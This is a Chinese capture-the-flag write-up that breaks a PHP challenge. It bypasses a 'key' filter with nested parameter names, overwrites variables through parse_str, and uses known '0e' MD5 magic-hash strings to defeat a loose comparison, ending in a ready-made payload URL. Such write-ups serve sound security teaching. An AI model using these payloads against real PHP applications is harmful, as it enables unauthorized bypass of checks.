既然直接访问不可取,那么我们来解读一下这个`index.php.bak`的`php`代码含义.
```php
include_once "flag.php";          // 包含flag变量(假设定义了$flag)
ini_set("display_errors", 0);     // 关闭错误显示

// 从URL中提取查询字符串(?之后的部分)
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str, 1);           // 去掉开头的'?'

// 删除所有出现的"key"子串(用于绕过过滤,但可被嵌套绕过)
$str = str_replace('key', '', $str);

// 解析查询字符串,将参数注册为变量(如 key1=xxx 会设置 $key1)
parse_str($str);

// 输出两个MD5值(调试用,不影响判断)
echo md5($key1);
echo md5($key2);

// 关键条件:两个MD5值弱相等(==),但原始值不全等(!==)
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
```
这段PHP代码存在两个核心漏洞:
**变量覆盖**(`parse_str`)和
**弱类型哈希比较绕过**(`md5($key1) == md5($key2)`).
## 漏洞利用思路

### 1. 变量覆盖
`parse_str($str)` 会将查询字符串中的键值对直接注册为变量,
例如 `key1=123` 会创建 `$key1 = '123'`.
攻击者可以控制 `$key1` 和 `$key2` 的值.

### 2. 过滤绕过
代码执行了 `str_replace('key', '', $str)`,
这意味着如果你直接传入 `key1=xxx`,会被替换为 `1=xxx`,
导致变量名变成 `$1` 而非 `$key1`.  

绕过方法:利用字符串嵌套,
例如传入 `kkeyey1`,替换掉中间的 `key` 后,剩余字符恰好拼成 `key1`:

- 原始:`kkeyey1`
- 替换 `key`(位置1~3)为空 → 剩下 `k` + `ey1` = `key1` ✅

同理,`kkeyey2` → `key2`.

### 3. MD5弱比较绕过
PHP的 `==` 是**弱类型比较**,当比较两个**以 `0e` 开头的纯数字字符串**时,
它们会被当作科学计数法(如 `0e123` = 0),因此 `0e... == 0e...` 结果为 `true`.  
我们需要找到两个不同的字符串,其MD5值都符合 `0e[0-9]+` 格式.

经典的例子:
- `QNKCDZO` → MD5: `0e830400451993494058024219903391`
- `s878926199a` → MD5: `0e545993274517709034328855841020`

它们的MD5值在弱比较中相等,但原始字符串 `QNKCDZO` 和 `s878926199a` 显然不全等.

## 最终Payload

构造查询字符串,利用嵌套绕过过滤:

```
?kkeyey1=QNKCDZO&kkeyey2=s878926199a
```

完整URL访问:

```
http://目标地址/?kkeyey1=QNKCDZO&kkeyey2=s878926199a
```

### 执行流程:
1. `$str` = `"kkeyey1=QNKCDZO&kkeyey2=s878926199a"`
2. `str_replace('key', '', $str)` → 变为 `"key1=QNKCDZO&key2=s878926199a"`
3. `parse_str` → 设置 `$key1='QNKCDZO'`, `$key2='s878926199a'`
4. `md5($key1)` = `0e830400451993494058024219903391`
5. `md5($key2)` = `0e545993274517709034328855841020`
6. 弱比较 `0e830... == 0e545...` → `true`
7. 全等比较 `$key1 !== $key2` → `true`(因为字符串不同)
8. 输出 `$flag`

## 注意事项
- 如果目标PHP版本较新,可能已修复部分哈希碰撞问题,
但经典 `0e` 碰撞在绝大多数环境中依然有效.
- 如果 `flag.php` 中 `$flag` 未定义,可能无输出,但题目设计如此,通常有效.
